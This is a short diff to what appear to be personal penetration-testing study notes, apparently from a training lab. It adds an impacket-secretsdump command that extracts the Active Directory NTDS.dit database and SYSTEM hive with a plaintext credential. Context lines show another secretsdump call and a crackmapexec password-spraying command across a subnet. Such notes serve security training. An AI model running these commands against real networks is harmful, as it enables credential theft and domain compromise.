@@ -279,6 +279,11 @@ a. Network Exploitation
 		impacket-secretsdump domain/username:password@IPADDRESS
 		impacket-secretsdump medtech/joe:Flowers1@172.16.229.11 
 
+		where dc: 172.16.122.10
+		you have access on 172.16.122.11
+		impacket-secretsdump -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 172.16.122.10 medtech/joe:Flowers1@172.16.122.11
+
+
 		Password Spraying: Password spraying involves attempting a single password against multiple user accounts, avoiding account lockouts due to multiple failed authentication attempts:
 		crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
 
